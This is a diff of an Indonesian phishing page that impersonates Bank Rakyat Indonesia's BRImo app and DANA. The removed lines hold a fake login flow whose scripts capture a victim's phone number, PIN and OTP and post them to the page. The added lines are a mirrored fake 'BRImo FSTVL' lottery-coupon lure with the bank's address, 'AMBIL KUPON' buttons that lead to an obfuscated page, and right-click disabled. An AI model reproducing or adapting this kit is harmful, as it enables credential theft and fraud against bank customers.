@@ -1,276 +1,279 @@
-<html>
-
-<head>
-    <meta name="theme-color" content="#0F78CB"> 
+<!DOCTYPE html><html lang="id"><!-- Mirrored from z.4zur424.my.id/fstvl/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Feb 2025 10:21:46 GMT --><!-- Mirrored from ovwyz.web.id/ by HTTrack Website Copier/3.x [XR&CO'2017], Thu, 27 Feb 2025 07:39:31 GMT --><head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
-   
-	<meta property="og:title" content="PT. Bank Rakyat Indonesia (Persero) Tbk."> 
-	<meta property="og:description" content="Gedung BRI Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<title>𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗿𝗶𝗺𝗼 𝗙𝗦𝗧𝗩𝗟</title>
-<meta property="og:title" content="𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗿𝗶𝗺𝗼 𝗙𝗦𝗧𝗩𝗟">
-<meta property="twitter:title" content="𝗞𝘂𝗽𝗼𝗻 𝗨𝗻𝗱𝗶𝗮𝗻 | 𝗕𝗿𝗶𝗺𝗼 𝗙𝗦𝗧𝗩𝗟">
-<meta property="twitter:card" content="summary_large_image">
-<meta property="og:image:type" content="image/jpeg">
-<meta content="https://hosting.tigerengine.id/dvxg6y.jpg" property="og:image">
-
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
- <link href="https://hosting.tigerengine.id/dvxg6y.jpg" rel="icon" type="image/x-icon">
-    <link href="https://hosting.tigerengine.id/dvxg6y.jpg" rel="apple-touch-icon">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-
-<meta property="twitter:card" content="summary_large_image">
-<meta property="og:image:type" content="image/jpeg">
-<meta content="https://hosting.tigerengine.id/dvxg6y.jpg" property="og:image">
-
     
-    <!-- Demo styles -->
+<meta name="theme-color" content="#123c69">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta property="og:image" content="m4.html">
+
+  <meta name="description" content="Gedung BRI Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia">
+    <title>BRImo FSTVL</title>
     <style>
-      html,
-      body {
-        position: relative;
-        height: 100%;
-		overflow: hidden; 
-        background-color: #fff;
-        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
-        font-size: 14px;
-        color: #000;
-        margin: 0;
-        padding: 0;
-      }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+        }
 
-	</style>
-</head>
-<body style="background-color: #fff;">
-    <div style="display:none;" class="index">
-        <div class="header">
-            
-        </div>
-        <div class="content">
-            <div class="hero">
-                
-            </div>
-            <h1>Dompet digital untuk kamu!</h1>
-            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
-            <div class="line">
-            </div>
-            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
-            <button type="button" onclick="next();">LOGIN</button>
-        </div>
-    </div>
-    <div class="start" style="display:none; background-color: #fff;">
-        
-    </div>
-    <div class="container hid">
-        <div class="box-login" style="background-color: #fff;">
-            <div id="process" name="process" class="process" style="display: none;">
-                <div class="loading">
-                    
-                </div>
-            </div>
-            <div class="header11">
-                <a href="nama.html"><img src="https://hosting.tigerengine.id/2pf8rd.jpg" style="width: 100%; left: 0px; top: 0px; height: 95%"></a>
-            </div>
-            
-<script>
-$(document).ready(function() {
-    $('#inp').on('input', function() {
-        if ($(this).val() == '0' || $(this).val() == '62') {
-            $(this).val('');
+        .navbar img{
+            width: 100%;
+            height: 100px;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            z-index: 1000;
         }
-    });
-});
-</script>
-<script>
-$(document).ready(function() {
-    $('#inp').mask('000-0000-000000');
-});
-</script>
-<script>
-let inp = document.getElementById("inp");
-let btn = document.getElementById("btn");
-inp.addEventListener("input", val);
 
-function val() {
-    if (inp.value.length > 10) {
-        btn.disabled = false;
-    } else {
-        btn.disabled = true;
-    }
-};
-</script>
-<script>
-$('.inppin').on('input', function(event) {
-    const inputs = $('.inppin');
-    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
-    if (isAllFilled == true) {
-        $(event.target).blur();
-        sendPin();
-    };
-    const index = inputs.index(this);
-    const currentValue = event.target.value;
-    if (currentValue.length === 1) {
-        if (index < inputs.length - 1) {
-            inputs[index + 1].focus();
+        .navbar img {
+            height: auto;
+            cursor: pointer;
         }
-    } else if (currentValue.length === 0) {
-        if (index > 0) {
-            inputs[index].focus();
+
+        .info-box {
+            background: #fff;
+            margin: 20px auto;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 78%;
+            text-align: center;
         }
-    };
-});
-$('.inppin').on('keydown', function(event) {
-    const inputs = $('.inppin');
-    const key = event.key;
-    const index = inputs.index(this);
-    if (key === 'Backspace' && event.target.value.length === 0) {
-        if (index > 0) {
-            inputs[index - 1].focus();
+
+        .info-box h3 {
+            color: #2d4d9f;
+            font-size: 18px;
+            text-align: left;
+            margin-bottom: 10px;
         }
-    };
-});
-</script>
-<script>
-$('.inpotp').on('input', function(event) {
-    const inputs = $('.inpotp');
-    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
-    if (isAllFilled == true) {
-        $(event.target).blur();
-        sendOtp();
-    }
-    const index = inputs.index(this);
-    const currentValue = event.target.value;
-    if (currentValue.length === 1) {
-        if (index < inputs.length - 1) {
-            inputs[index + 1].focus();
+
+        .info-box p {
+            color: #555;
+            font-size: 14px;
+            text-align: left;
+            line-height: 1.6;
         }
-    } else if (currentValue.length === 0) {
-        if (index > 0) {
-            inputs[index].focus();
+
+        .btn-upgrade {
+            display: inline-block;
+            font-size: 12px;
+            font-weight: bold;
+            padding: 12px 100px;
+            border: none;
+            border-radius: 50px;
+            text-decoration: none;
+            position: relative;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+            cursor: pointer;
         }
-    };
-});
-$('.inpotp').on('keydown', function(event) {
-    const inputs = $('.inpotp');
-    const key = event.key;
-    const index = inputs.index(this);
-    if (key === 'Backspace' && event.target.value.length === 0) {
-        if (index > 0) {
-            inputs[index - 1].focus();
+
+        .btn-upgrade-limit {
+            background-color: #357EC7; /* Warna oranye */
+            color: white;
         }
-    };
-});
-</script>
-<script>
-$(document).ready(function() {
-    $('.clear').click(function() {
-        $('.inppin').val('');
-        $('#pin1').focus();
-    });
-    $('.clearotp').click(function() {
-        $('.inpotp').val('');
-        $('#otp1').focus();
-    });
-    $('.show').click(function() {
-        $('.inppin').each(function() {
-            if ($(this).attr('type') === 'password') {
-                $(this).attr('type', 'number');
-                $(".show").text("SEMBUNYIKAN");
-            } else {
-                $(this).attr('type', 'password');
-                $(".show").text("TAMPILKAN");
+
+        .btn-apply-card {
+            background-color: #357EC7; /* Warna biru laut */
+            color: white;
+        }
+
+        /* Animasi zoom dan shake */
+        .btn-upgrade.bounce {
+            animation: zoomInShake 2s ease infinite;
+        }
+
+        @keyframes zoomInShake {
+            0% {
+                transform: scale(0.5);
             }
+            50% {
+                transform: scale(1.1); /* Membesar sedikit */
+            }
+            70% {
+                transform: scale(1.1) translateX(-5px); /* Gerakan shake kiri */
+            }
+            80% {
+                transform: scale(1.1) translateX(5px); /* Gerakan shake kanan */
+            }
+            90% {
+                transform: scale(1.1) translateX(-3px); /* Gerakan shake kiri */
+            }
+            100% {
+                transform: scale(1.1) translateX(3px); /* Gerakan shake kanan */
+            }
+        }
+
+        .info-box img {
+            width: 100%;
+            height: 80px;
+        }
+
+        .photo-box {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .photo-box img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .slider-container {
+    width: 100%; 
+    max-width: 320px; /* Batasi ukuran maksimum slider */
+    height: 160px; /* Atur tinggi slider sesuai dimensi gambar */
+    position: relative;
+    overflow: hidden;
+    border-radius: 10px;
+    margin: 78px auto;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+}
+
+.slides img {
+    width: 100%; 
+    height: 100%; /* Gambar akan memenuhi tinggi slider */
+    object-fit: cover; /* Potong gambar untuk memenuhi dimensi slider */
+    flex-shrink: 0;
+}
+
+
+        .slides {
+            display: flex;
+            transition: transform 1s ease-in-out;
+            width: 100%; /* 10 images */
+        }
+
+      
+
+        .indicators {
+            text-align: center;
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+        }
+
+        .indicators span {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            margin: 0 5px;
+            background-color: #ccc;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .indicators .active {
+            background-color: #007BFF;
+        }
+  
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <img src="images/nav.png" alt="BRImo Logo">
+    </div>
+        
+        <div class="slider-container">
+        <div class="slides" id="slider-5">
+            <img src="images/5.png" alt="Photo 1">
+            <img src="images/2.png" alt="Photo 2">
+            <img src="images/3.png" alt="Photo 3">
+            <img src="images/4.png" alt="Photo 4">
+            <img src="images/1.png" alt="Photo 5">
+            <img src="images/m6.jpg" alt="Photo 6">
+            <img src="images/m7.jpg" alt="Photo 7">
+            <img src="images/m8.jpg" alt="Photo 8">
+            <img src="images/m9.jpg" alt="Photo 9">
+            <img src="images/m10.jpg" alt="Photo 10">
+        </div>
+        <div class="indicators">
+            <span onclick="moveToSlide('slider-2', 0)" class="active"></span>
+            <span onclick="moveToSlide('slider-2', 1)"></span>
+            <span onclick="moveToSlide('slider-2', 2)"></span>
+            <span onclick="moveToSlide('slider-2', 3)"></span>
+            <span onclick="moveToSlide('slider-2', 4)"></span>
+            <span onclick="moveToSlide('slider-2', 5)"></span>
+            <span onclick="moveToSlide('slider-2', 6)"></span>
+            <span onclick="moveToSlide('slider-2', 7)"></span>
+            <span onclick="moveToSlide('slider-2', 8)"></span>
+            <span onclick="moveToSlide('slider-2', 9)"></span>
+        </div>
+    </div>
+
+    <div class="info-box">
+        <img src="images/hajaja.png" alt="Gambar Statis">
+        <h3>• Menangkan Hadiah Berlimpah di
+Brimo FSTVL</h3>
+        <p>Semakin besar saldo tabunganmu selama periode program, semakin besar juga kesempatanmu untuk bawa pulang berbagai pilihan undian keren dari BRImo FSTVL!.</p>
+        <a href="kssns828nsjs1928ms.html" class="btn-upgrade btn-upgrade-limit">AMBIL KUPON</a>
+    </div>
+    <div class="info-box">
+        <img src="images/jsjsjs.png" alt="Gambar Statis">
+        <h3>• Tambah Terus Saldo,
+dan Transaksi Setiap Bulan!</h3>
+        <p>Apa pun kebutuhan kamu bisa dipenuhi pakai BRImo yang Mudah dan Serba Bisa. Mulai dari buka tabungan emas, beli tiket traveling, transaksi internasional, beli tiket BRI Liga 1, dan voucher games. Bayar asuransi, cicilan, belanja pakai QRIS, atau transaksi pakai Kartu Kredit dan Debit BRI.</p>
+        <a href="kssns828nsjs1928ms.html" class="btn-upgrade btn-apply-card">AMBIL KUPON</a>
+    </div><br><br><br>
+
+    <div class="photo-box">
+        <img src="images/footer.png" alt="Gambar Foto">
+    </div>
+
+    <script>
+        // Tombol-tombol
+        const btnUpgrade = document.querySelector('.btn-upgrade-limit');
+        const btnApply = document.querySelector('.btn-apply-card');
+
+        // Variabel untuk mengontrol tombol aktif
+        let toggle = true;
+
+        // Fungsi untuk mengatur animasi bergantian
+        function toggleAnimation() {
+            if (toggle) {
+                btnUpgrade.classList.add('bounce'); // Tambahkan animasi bounce ke tombol atas
+                btnApply.classList.remove('bounce'); // Hentikan animasi tombol bawah
+            } else {
+                btnUpgrade.classList.remove('bounce'); // Hentikan animasi tombol atas
+                btnApply.classList.add('bounce'); // Tambahkan animasi bounce ke tombol bawah
+            }
+            toggle = !toggle; // Balik status toggle
+        }
+
+        // Jalankan animasi bergantian setiap 3 detik
+        setInterval(toggleAnimation, 3000);
+        
+        document.addEventListener('DOMContentLoaded', () => {
+    const sliders = document.querySelectorAll('.slider-container');
+
+    sliders.forEach(slider => {
+        const slides = slider.querySelector('.slides');
+        const indicators = slider.querySelectorAll('.indicators span');
+        let currentIndex = 0;
+
+        function moveToSlide(index) {
+            slides.style.transform = `translateX(-${index * 100}%)`;
+            indicators.forEach((indicator, i) => {
+                indicator.classList.toggle('active', i === index);
+            });
+            currentIndex = index;
+        }
+
+        indicators.forEach((indicator, index) => {
+            indicator.addEventListener('click', () => moveToSlide(index));
         });
+
+        // Auto-play (opsional)
+        setInterval(() => {
+            const nextIndex = (currentIndex + 1) % indicators.length;
+            moveToSlide(nextIndex);
+        }, 5000); // Setiap 5 detik
     });
 });
-</script>
-<script>
-function sendNohp(event) {
-    $("#process").show();
-    event.preventDefault();
-    $("#inp").blur();
-    $.ajax({
-        type: 'POST',
-        url: '',
-        data: $('#formNohp').serialize(),
-        dataType: 'text',
-        success: function() {
-            $("#process").hide();
-            $("#formNohp").fadeOut();
-            setTimeout(function() {
-                $("#inp").val('');
-                $("#formPin").fadeIn();
-                $("#pin1").focus();
-            }, 500);
-        }
+document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
     });
-};
-</script>
-<script>
-function sendPin() {
-    $("#process").show();
-    $.ajax({
-        type: 'POST',
-        url: '',
-        data: $('#formPin').serialize(),
-        dataType: 'text',
-        success: function() {
-            $("#process").hide();
-            $('.inppin').val('');
-            $(".bgotp").fadeIn();
-            setInterval(countdown, 1000);
-            $("#otp1").focus();
-        }
-    });
-};
-</script>
-<script>
-function sendOtp() {
-    $(".loadingOtp").show();
-    $.ajax({
-        type: 'POST',
-        url: '',
-        data: $('#formOtp').serialize(),
-        dataType: 'text',
-        success: function() {
-            window.location.href = "googleplayDANA.html";
-            setTimeout(function() {
-                $(".loadingOtp").hide();
-                $('.inpotp').val('');
-                $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
-                $(".alert").css("color", "red");
-            }, 3000);
-        }
-    });
-};
-</script>
-<script>
-function countdown() {
-    var count = parseInt($('#countdown').text());
-    if (count !== 0) {
-        $('#countdown').text(count - 1);
-    } else {
-        $('#countdown').text('120');
-    }
-};</script>
-<script>
-window.onload = function() {
-    setTimeout(function() {
-        $(".start").fadeIn();
-        setTimeout(function() {
-            $(".start").fadeOut(1000);
-            setTimeout(function() {
-                $(".container").fadeIn(200);
-                $("#inp").focus();
-            }, 1000);
-        }, 2000);
-    }, 500);
-}
-</script>
-
-
-
-</body>
-</html>
+    </script>
